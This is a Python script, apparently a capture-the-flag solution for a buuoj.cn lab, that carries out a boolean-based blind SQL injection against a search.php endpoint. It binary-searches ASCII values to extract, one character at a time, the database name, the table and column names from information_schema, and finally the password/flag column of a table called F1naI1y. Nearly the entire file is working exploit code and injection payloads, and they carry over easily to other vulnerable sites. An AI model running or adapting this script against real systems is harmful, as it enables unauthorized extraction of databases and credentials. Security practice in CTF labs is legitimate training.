import requests
import time

# url是随时更新的，具体的以做题时候的为准
url = 'http://2a2b4136-95dc-4489-8dbb-09f27849a1ff.node4.buuoj.cn:81/search.php?id='
i = 0
flag = ''
while True:
    i += 1
    # 从可打印字符开始
    begin = 32
    end = 126
    tmp = (begin + end) // 2
    while begin < end:
        print(begin, tmp, end)
        time.sleep(0.1)
        # 爆数据库
        # payload = "''or(ascii(substr(database(),%d,1))>%d)" % (i, tmp)
        # 爆表
        # payload = "''or(ascii(substr((select(GROUP_CONCAT(TABLE_NAME))from(information_schema.tables)where(TABLE_SCHEMA=database())),%d,1))>%d)" % (i, tmp)
        # 爆字段
        # payload = "''or(ascii(substr((select(GROUP_CONCAT(COLUMN_NAME))from(information_schema.COLUMNS)where(TABLE_NAME='F1naI1y')),%d,1))>%d)" % (i, tmp)
        # 爆flag 要跑很久
        # payload = "''or(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))>%d)" % (i, tmp)
        # 爆flag 很快
        payload = "''or(ascii(substr((select(password)from(F1naI1y)where(username='flag')),%d,1))>%d)" % (i, tmp)
        # 错误示例
        # payload = "''or(ascii(substr((select(GROUP_CONCAT(fl4gawsl))from(Flaaaaag)),%d,1))>%d)" % (i, tmp)

        r = requests.get(url+payload)
        if 'Click' in r.text:
            begin = tmp + 1
            tmp = (begin + end) // 2
        else:
            end = tmp
            tmp = (begin + end) // 2

    flag += chr(tmp)
    print(flag)
    if begin == 32:
        break

